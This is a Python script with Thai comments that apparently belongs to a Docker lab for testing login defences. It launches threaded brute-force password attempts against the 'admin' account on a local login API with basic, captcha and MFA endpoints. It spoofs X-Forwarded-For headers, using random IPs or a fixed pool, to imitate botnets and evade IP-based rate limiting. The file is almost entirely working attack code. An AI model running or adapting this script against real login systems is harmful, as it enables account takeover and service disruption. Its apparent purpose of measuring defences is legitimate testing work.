import requests
import time
import os
import socket
import random
import string
import concurrent.futures
import threading

# อ่าน endpoint จาก Docker Compose
TARGET_ENDPOINT = os.getenv("TARGET_ENDPOINT", "basic")
TARGET_URL = f"http://web:3000/api/login/{TARGET_ENDPOINT}"
CONCURRENCY = int(os.getenv("CONCURRENCY", 10))
DURATION = int(os.getenv("DURATION", 60))

# IP Spoofing Mode:
#   "random" → สุ่ม IP ใหม่ทุก request (จำลอง Advanced Residential Proxy Botnet)
#   "pool"   → สุ่มจาก IP Pool จำกัด (จำลอง Cheap Botnet / Datacenter Proxies)
#   "fixed"  → ใช้ IP จริงของ Container
SPOOF_MODE = os.getenv("SPOOF_MODE", "pool")
IP_POOL_SIZE = int(os.getenv("IP_POOL_SIZE", 50))

def get_my_ip():
    try:
        hostname = socket.gethostname()
        return socket.gethostbyname(hostname)
    except:
        return "Unknown"

def generate_random_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

def generate_random_password():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=16))

# Pre-generate IP Pool ตอนเริ่มต้น (ใช้ซ้ำตลอดการโจมตี)
IP_POOL = [generate_random_ip() for _ in range(IP_POOL_SIZE)]


PASSWORD_POOL = [generate_random_password() for _ in range(1000)]
def attack_worker(worker_id, stop_event):
    my_ip = get_my_ip()
    
    while not stop_event.is_set():
        # --- [MODIFIED] Dynamic Payload ตาม Endpoint ---
        payload = {
            "username": "admin",
            "password": random.choice(PASSWORD_POOL) # ดึงจาก Pool ลดภาระ CPU
        }
        
        # เพิ่มฟิลด์ให้ตรงกับที่ Web Server ต้องการ เพื่อให้ทะลุ Validation ไปถึงชั้นทดสอบได้
        if TARGET_ENDPOINT == "captcha":
            payload["captchaToken"] = "invalid-token-from-bot"
        elif TARGET_ENDPOINT == "mfa":
            payload["mfaCode"] = "000000" # ส่งรหัสผิด เพื่อไปกระตุ้น otplib
            
        headers = {}
        if SPOOF_MODE == "random":
            headers["X-Forwarded-For"] = generate_random_ip()
        elif SPOOF_MODE == "pool":
            headers["X-Forwarded-For"] = random.choice(IP_POOL)
        else:  # "fixed"
            headers["X-Forwarded-For"] = my_ip

        try:
            # ใช้ requests.post แบบไม่มี Session ถูกต้องแล้ว เพื่อบังคับให้เกิด TCP Handshake ใหม่
            response = requests.post(TARGET_URL, json=payload, headers=headers, timeout=1)

            if response.status_code == 200:
                print(f"[BOT-{worker_id}]  เจาะเข้าได้แล้ว! Response: {response.text}")
            elif response.status_code == 429:
                print(f"[BOT-{worker_id}]  ถูกบล็อก! (Rate Limited)")
            # สามารถซ่อน Log อื่นๆ ได้ตามเดิมเพื่อไม่ให้ Terminal รก
                
        except Exception as e:
            pass

def start_attack():
    spoof_desc = {
        "random": "เปิด — Random IP ทุก request (Advanced Botnet)",
        "pool": f"เปิด — IP Pool จำกัด {IP_POOL_SIZE} IPs (Cheap Botnet)",
        "fixed": "ปิด — ใช้ IP จริงของ Container"
    }
    
    print(f"[*] เริ่มต้นโจมตีไปที่: {TARGET_URL}")
    print(f"[*] โหมด: {TARGET_ENDPOINT}")
    print(f"[*] ความแรง: {CONCURRENCY} Threads/Container")
    print(f"[*] ระยะเวลา: {DURATION} วินาที")
    print(f"[*] IP Spoofing: {spoof_desc.get(SPOOF_MODE, SPOOF_MODE)}")
    print("[*] กำลังรอให้ Web Server ตื่น... (5 วินาที)")
    time.sleep(5) 

    print("[*] FIRE !!!")
    
    stop_event = threading.Event()
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=CONCURRENCY) as executor:
        futures = [executor.submit(attack_worker, i, stop_event) for i in range(CONCURRENCY)]
        
        time.sleep(DURATION)
        
        print("[*] หมดเวลาโจมตี กำลังสั่งหยุด Worker...")
        stop_event.set()
        
        concurrent.futures.wait(futures)
        
    print("[*] การโจมตีเสร็จสิ้น")

if __name__ == "__main__":
    start_attack()

